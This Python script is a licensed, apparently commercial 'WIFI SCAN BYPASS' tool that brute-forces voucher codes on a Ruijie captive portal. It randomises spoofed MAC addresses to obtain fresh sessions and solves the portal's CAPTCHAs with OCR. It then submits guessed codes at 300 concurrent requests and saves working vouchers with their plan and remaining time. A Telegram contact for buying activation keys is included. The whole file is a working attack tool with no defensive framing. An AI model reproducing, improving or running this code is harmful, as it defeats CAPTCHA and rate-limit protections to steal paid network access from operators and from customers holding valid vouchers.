import asyncio
import aiohttp
import json
import base64
import random
import re
import os
import string
import time
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta
import sys
import hashlib
import uuid
import shutil

# ANSI Color Codes
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
WHITE = "\033[97m"
PURPLE = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"
CLEAR_LINE = "\033[K"

# Configuration
CONCURRENCY = 300
BATCH_SIZE = 150
SUCCESS_FILE = "success_codes.txt"
LIMITED_FILE = "limited_codes.txt"
SECRET_SALT = "YOURGOD_CONTROL_PANEL_2026"
LICENSE_FILE = ".license_key"
ID_FILE = ".device_id"
URL_FILE = ".session_url"
TELEGRAM_ACC = "@aiden2410"
TELEGRAM_CHANNEL = "https://t.me/aiden_24"

# Global state
CURRENT_SESSION_URL = None
DEVICE_ID = None
EXPIRY_INFO = "Not Registered"

# OCR Initialization
_ocr = ddddocr.DdddOcr(show_ad=False)

def generate_device_id():
    global DEVICE_ID
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            stored_id = f.read().strip()
            if stored_id.startswith("RU-") and len(stored_id) >= 12:
                DEVICE_ID = stored_id
                return stored_id
    node = uuid.getnode()
    hw_hash = hashlib.sha256(str(node).encode()).hexdigest().upper()
    unique_part = hw_hash[:9]
    new_id = f"RU-{unique_part}"
    with open(ID_FILE, "w") as f:
        f.write(new_id)
    DEVICE_ID = new_id
    return new_id

def get_remaining_time(expiry_date):
    """Calculates and formats the remaining time until expiry."""
    now = datetime.now()
    remaining = expiry_date - now
    
    if remaining.total_seconds() <= 0:
        return f"{RED}Key Expired!{RESET}"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, _ = divmod(remainder, 60)
    
    parts = []
    if days > 0: parts.append(f"{days}d")
    if hours > 0: parts.append(f"{hours}h")
    if minutes > 0 and days == 0: parts.append(f"{minutes}m") # Only show minutes if less than a day
    
    if not parts: return f"{RED}Expiring soon...{RESET}"
    
    return f"{GREEN}{', '.join(parts)} left{RESET}"

def verify_short_key(device_id, key):
    global EXPIRY_INFO
    if '-' not in key: return False, "Invalid Key Format!"
    prefix, hash_part = key.split('-', 1)
    
    days_map = {
        '1H': 1/24, '5H': 5/24,
        '1D': 1, '2D': 2, '3D': 3, '4D': 4, '5D': 5, '6D': 6, '7D': 7, '8D': 8, '9D': 9, '10D': 10,
        '15D': 15, '20D': 20, '25D': 25, '30D': 30, '2MO': 60, 'UNLIMIT': 3650
    }
    
    if prefix not in days_map:
        return False, "Unsupported Time Option!"
    
    days = days_map[prefix]
    
    for i in range(31):
        check_date = datetime.now() - timedelta(days=i)
        date_str = check_date.strftime("%Y%m%d")
        combined = device_id + prefix + date_str + SECRET_SALT
        correct_hash = hashlib.sha256(combined.encode()).hexdigest()[:6].upper()
        
        if hash_part == correct_hash:
            if prefix == 'UNLIMIT':
                EXPIRY_INFO = f"{GREEN}Lifetime Access{RESET}"
                return True, "Lifetime Access"
            expiry_date = check_date + timedelta(days=days)
            if expiry_date < datetime.now():
                EXPIRY_INFO = f"{RED}Key Expired!{RESET}"
                return False, "Key Expired!"
            
            # Show remaining time instead of fixed date
            EXPIRY_INFO = get_remaining_time(expiry_date)
            return True, EXPIRY_INFO
            
    EXPIRY_INFO = f"{RED}Invalid Activation Code!{RESET}"
    return False, "Invalid Activation Code!"

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None: return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Verify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") else None

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session, session_url):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36'}
    try:
        async with session.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return session_id.group(1) if session_id else None
    except: return None

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown' or total_minutes is None: return 'Unknown'
    try:
        minutes = int(total_minutes)
        hours, rem_minutes = divmod(minutes, 60)
        if hours > 0 and rem_minutes > 0: return f"{hours}h {rem_minutes}m"
        elif hours > 0: return f"{hours}h"
        else: return f"{rem_minutes}m"
    except: return str(total_minutes)

async def Get_Code_Details(session_id, connector):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as fresh_session:
            async with fresh_session.get(f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', headers=headers) as req:
                respond = await req.json()
                result = respond.get('result', {})
                profile_name = result.get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(result.get('totalMinutes', 'Unknown'))
                return profile_name, totaltime
    except: return "Unknown", "Unknown"

def iter_codes(mode, length):
    if mode == "1": # Number only
        if length == 6:
            codes = [f"{i:06d}" for i in range(1000000)]
            random.shuffle(codes)
            for code in codes: yield code
        else:
            while True: yield ''.join(random.choices(string.digits, k=length))
    elif mode == "2": # Lower letter only
        while True: yield ''.join(random.choices(string.ascii_lowercase, k=length))
    elif mode == "3": # Upper letter only
        while True: yield ''.join(random.choices(string.ascii_uppercase, k=length))
    elif mode == "4": # Mix lower-upper letter
        while True: yield ''.join(random.choices(string.ascii_letters, k=length))
    elif mode == "5": # Alphanumeric (Lower & number)
        while True: yield ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    else: raise ValueError(f"Unsupported scan mode: {mode}")

def format_success_box(code, plan, time_left):
    return f"""
{GREEN}╭──────────────────────────────────────────────────╮
│ 🚀 [ FOUND SUCCESS CODE ]                        │
│ ✨ SUCCESS : {code:<34} │
│ 📋 PLAN    : {plan:<34} │
│ ⏳ TIME    : {time_left:<34} │
╰──────────────────────────────────────────────────╯{RESET}"""

async def perform_check(session_url, code, connector, progress_data):
    post_url = 'https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US'
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(connector=connector, connector_owner=False, timeout=timeout) as task_session:
        session_id = await get_session_id(task_session, session_url)
        if not session_id:
            progress_data['retries'] += 1
            return
        auth_code = None
        for _ in range(5):
            try:
                image = await Captcha_Image(task_session, session_id)
                text = await Captcha_Text(image)
                if text and await Verify_Captcha(task_session, session_id, text):
                    auth_code = text
                    break
            except: continue
        if not auth_code:
            progress_data['retries'] += 1
            return
        data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
        headers = {
            "content-type": "application/json",
            "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
            "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        }
        try:
            async with task_session.post(post_url, json=data, headers=headers) as req:
                resp_text = await req.text()
                if 'logonUrl' in resp_text:
                    profile_name, time_left = await Get_Code_Details(session_id, connector)
                    progress_data['found_codes'].append(code)
                    with open(SUCCESS_FILE, "a") as f:
                        f.write(f"{code} - Plan: {profile_name} - Time: {time_left} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    
                    sys.stdout.write(f"\r{CLEAR_LINE}{format_success_box(code, profile_name, time_left)}\n")
                    sys.stdout.flush()
                elif 'STA' in resp_text:
                    progress_data['found_codes'].append(code)
                    with open(LIMITED_FILE, "a") as f:
                        f.write(f"{code} - Limited (STA) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    sys.stdout.write(f"\r{CLEAR_LINE}{YELLOW}{BOLD}[!] LIMITED CODE: {code} (STA response){RESET}\n")
                    sys.stdout.flush()
                elif 'request limited' in resp_text: progress_data['retries'] += 1
        except: progress_data['retries'] += 1

def get_center(text):
    terminal_width = shutil.get_terminal_size().columns
    lines = text.split('\n')
    centered_lines = []
    for line in lines:
        clean_line = re.sub(r'\033\[[0-9;]*m', '', line)
        padding = (terminal_width - len(clean_line)) // 2
        centered_lines.append(" " * max(0, padding) + line)
    return "\n".join(centered_lines)

def print_banner(mode=None):
    os.system('cls' if os.name == 'nt' else 'clear')
    terminal_width = shutil.get_terminal_size().columns
    
    banner_art = f"""
{GREEN}{BOLD}
      ___       __   ________  _______  __    __  
     /   \     |  | |       \ |   ____||  \  |  | 
    /  ^  \    |  | |  .--.  ||  |__   |   \ |  | 
   /  /_\  \   |  | |  |  |  ||   __|  |  . `  | 
  /  _____  \  |  | |  '--'  ||  |____ |  |\   | 
 /__/     \__\ |__| |_______/ |_______||__| \__| 
{RESET}"""
    sub_text = f"\n\n{YELLOW}{BOLD}[ WIFI SCAN BYPASS ]{RESET}"
    telegram_text = f"\n{WHITE}{BOLD}📱 TELEGRAM : {GREEN}{BOLD}{TELEGRAM_ACC}{RESET}\n\n"
    
    print(get_center(banner_art))
    print(get_center(sub_text))
    print(get_center(telegram_text))
    print(f"{YELLOW}{'-' * terminal_width}{RESET}")
    
    if DEVICE_ID:
        info_text = f"{WHITE}{BOLD}[*] Device ID : {YELLOW}{DEVICE_ID}{RESET}\n{WHITE}{BOLD}[*] Expiry    : {EXPIRY_INFO}{RESET}"
        print(info_text)
        print(f"{YELLOW}{'-' * terminal_width}{RESET}")
        
    if mode:
        print(f"{CYAN}{BOLD}🚀 SCANNER STARTED | Mode: {mode}{RESET}")
        print(f"{YELLOW}{BOLD}📂 Output File: {SUCCESS_FILE}{RESET}")
        print(f"{YELLOW}{'-' * terminal_width}{RESET}")

def display_progress(progress_data, total, current_code=""):
    checked, found, retries, start_time = progress_data['checked'], len(progress_data['found_codes']), progress_data['retries'], progress_data['start_time']
    elapsed = time.monotonic() - start_time
    speed = (checked / elapsed * 60) if elapsed > 0 else 0
    bar_length = 15
    
    if total:
        percent = (checked / total) * 100
        filled = int(bar_length * checked // total)
        bar = "█" * filled + "░" * (bar_length - filled)
        progress_str = f"\r{CLEAR_LINE}{PURPLE}[{bar}]{RESET} {WHITE}{checked}/{total} | {percent:.2f}% | {YELLOW}⚡ {speed:.0f} c/min{RESET} | {GREEN}FOUND {found} {CYAN}🔍 Testing: {current_code}{RESET}"
    else:
        progress_str = f"\r{CLEAR_LINE}{PURPLE}[SCANNING]{RESET} {WHITE}{checked} checked | {YELLOW}⚡ {speed:.0f} c/min{RESET} | {GREEN}FOUND {found} {CYAN}🔍 Testing: {current_code}{RESET}"
    
    sys.stdout.write(progress_str)
    sys.stdout.flush()

async def main():
    global CURRENT_SESSION_URL, DEVICE_ID, EXPIRY_INFO
    generate_device_id()
    
    user_key = ""
    if os.path.exists(LICENSE_FILE):
        with open(LICENSE_FILE, "r") as f:
            user_key = f.read().strip()
        valid, expiry = verify_short_key(DEVICE_ID, user_key)
        if not valid:
            user_key = ""

    # Key activation step
    if not user_key or EXPIRY_INFO.startswith(f"{RED}"):
        print_banner()
        msg = f"{PURPLE}{BOLD}📢 Please send this ID to Admin to get your Activation Code.{RESET}"
        print(msg)
        user_key = input(f"{WHITE}{BOLD}🔑 Enter Activation Code: {RESET}").strip().upper()
        valid, expiry = verify_short_key(DEVICE_ID, user_key)
        if not valid:
            print(f"{RED}{BOLD}❌ {expiry}{RESET}")
            time.sleep(2)
            return await main()
        with open(LICENSE_FILE, "w") as f:
            f.write(user_key)
        print(f"{GREEN}{BOLD}🚀 Activated Successfully! Welcome.{RESET}\n")
        time.sleep(1)
        
        # After successful activation, immediately ask for WiFi URL
        print_banner()
        CURRENT_SESSION_URL = input(f"\n{WHITE}{BOLD}🔗 Enter Session URL: {RESET}").strip()
        if not CURRENT_SESSION_URL:
            print(f"{RED}Session URL is required!{RESET}")
            time.sleep(1)
            return await main()
        with open(URL_FILE, "w") as f:
            f.write(CURRENT_SESSION_URL)
        print(f"{GREEN}Session URL saved successfully!{RESET}")
        time.sleep(1)
        return await main()

    # Load persistent Session URL if it exists (for returning users)
    if CURRENT_SESSION_URL is None:
        if os.path.exists(URL_FILE):
            with open(URL_FILE, "r") as f:
                CURRENT_SESSION_URL = f.read().strip()
        
        # If no URL exists even for activated users, ask for it
        if not CURRENT_SESSION_URL:
            print_banner()
            CURRENT_SESSION_URL = input(f"\n{WHITE}{BOLD}🔗 Enter Session URL: {RESET}").strip()
            if not CURRENT_SESSION_URL:
                print(f"{RED}Session URL is required!{RESET}")
                time.sleep(1)
                return await main()
            with open(URL_FILE, "w") as f:
                f.write(CURRENT_SESSION_URL)
            return await main()

    # Main Menu
    print_banner()
    print(f"{GREEN}[1] Scan Ruijie Codes{RESET}")
    print(f"{GREEN}[2] Success Logs{RESET}")
    print(f"{YELLOW}[3] Clear Success Logs{RESET}")
    print(f"{YELLOW}[4] Change Session URL{RESET}")
    print(f"{GREEN}[5] Delete Activation Key{RESET}")
    print(f"{RED}[0] Exit{RESET}")
    terminal_width = shutil.get_terminal_size().columns
    print(f"{YELLOW}{'-' * terminal_width}{RESET}")
    main_choice = input(f"{CYAN}{BOLD}Select Option: {RESET}").strip()

    if main_choice == "1":
        print_banner()
        print(f"{GREEN}[+] Select Character Set for Bruteforce:{RESET}")
        print(f"{WHITE}[1] Number only {YELLOW}(e.g., 0-9){RESET}")
        print(f"{WHITE}[2] Lower letter only {YELLOW}(e.g., a-z){RESET}")
        print(f"{WHITE}[3] Upper letter only {YELLOW}(e.g., A-Z){RESET}")
        print(f"{WHITE}[4] Mix lower-upper letter {YELLOW}(e.g., a-z, A-Z){RESET}")
        print(f"{WHITE}[5] Alphanumeric {YELLOW}(Lower letter & number){RESET}")
        print(f"{WHITE}[0] Back to Main Menu{RESET}")
        print(f"{YELLOW}{'-' * terminal_width}{RESET}")
        scan_choice = input(f"{CYAN}{BOLD}Select Option: {RESET}").strip()
        
        if scan_choice == "0": return await main()
        if scan_choice not in ["1", "2", "3", "4", "5"]: return await main()

        print(f"{YELLOW}{'-' * terminal_width}{RESET}")
        try:
            length_input = input(f"{WHITE}{BOLD}Enter Code Length (e.g., 6 or 7): {RESET}").strip()
            code_length = int(length_input)
        except ValueError:
            print(f"{RED}Invalid length!{RESET}")
            time.sleep(1)
            return await main()

        mode_name_map = {
            "1": "Number only",
            "2": "Lower letter only",
            "3": "Upper letter only",
            "4": "Mix lower-upper",
            "5": "Alphanumeric"
        }
        mode_display = f"{mode_name_map[scan_choice]} (Length: {code_length})"
        print_banner(mode=mode_display)

        total = 10**code_length if scan_choice == "1" and code_length <= 8 else None
        code_gen = iter_codes(scan_choice, code_length)
        progress_data = {'checked': 0, 'found_codes': [], 'retries': 0, 'start_time': time.monotonic()}
        connector = aiohttp.TCPConnector(limit=CONCURRENCY, ssl=False)
        semaphore = asyncio.Semaphore(CONCURRENCY)
        
        async def sem_check(code):
            async with semaphore:
                await perform_check(CURRENT_SESSION_URL, code, connector, progress_data)
                progress_data['checked'] += 1
                display_progress(progress_data, total, current_code=code)
        
        try:
            while True:
                # Re-verify key periodically during scan to update "Time Left"
                if progress_data['checked'] % 1000 == 0:
                    verify_short_key(DEVICE_ID, user_key)

                batch = []
                for _ in range(BATCH_SIZE):
                    try: batch.append(next(code_gen))
                    except StopIteration: break
                if not batch: break
                await asyncio.gather(*[sem_check(code) for code in batch])
                if total and progress_data['checked'] >= total: break
        except (KeyboardInterrupt, asyncio.CancelledError):
            print(f"\n{RED}{BOLD}🛑 Scan stopped by user (CTRL+C).{RESET}")
        finally:
            await connector.close()
            display_progress(progress_data, total)
            print(f"\n\n{GREEN}{BOLD}Scan Completed! Found {len(progress_data['found_codes'])} codes.{RESET}")
            input(f"\n{WHITE}Press Enter to return to menu...{RESET}")
            return await main()

    elif main_choice == "2":
        print_banner()
        if os.path.exists(SUCCESS_FILE):
            print(f"\n{GREEN}{BOLD}--- Success Logs ---{RESET}")
            with open(SUCCESS_FILE, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line: continue
                    parts = line.split(' - ')
                    if len(parts) >= 3:
                        code = parts[0]
                        plan = parts[1].replace('Plan: ', '')
                        time_left = parts[2].replace('Time: ', '')
                        print(format_success_box(code, plan, time_left))
                    else:
                        print(f"{WHITE}{line}{RESET}")
        else:
            print(f"\n{RED}No logs found.{RESET}")
        input(f"\n{WHITE}Press Enter to return to menu...{RESET}")
        return await main()

    elif main_choice == "3":
        if os.path.exists(SUCCESS_FILE):
            os.remove(SUCCESS_FILE)
            print(f"\n{GREEN}Success logs cleared successfully!{RESET}")
        else:
            print(f"\n{RED}No logs to clear.{RESET}")
        time.sleep(1)
        return await main()

    elif main_choice == "4":
        print_banner()
        new_url = input(f"\n{WHITE}{BOLD}🔗 Enter New Session URL: {RESET}").strip()
        if new_url:
            CURRENT_SESSION_URL = new_url
            with open(URL_FILE, "w") as f:
                f.write(CURRENT_SESSION_URL)
            print(f"{GREEN}Session URL updated successfully!{RESET}")
            time.sleep(1)
        else:
            print(f"{RED}Update failed! URL cannot be empty.{RESET}")
            time.sleep(1)
        return await main()

    elif main_choice == "5":
        if os.path.exists(LICENSE_FILE):
            os.remove(LICENSE_FILE)
            print(f"\n{GREEN}Activation key deleted successfully!{RESET}")
            print(f"{YELLOW}Restarting application...{RESET}")
            time.sleep(1)
            return await main()
        else:
            print(f"\n{RED}No activation key found to delete.{RESET}")
            time.sleep(1)
            return await main()

    elif main_choice == "0":
        print(f"\n{YELLOW}Goodbye!{RESET}")
        return

if __name__ == "__main__":
    asyncio.run(main())
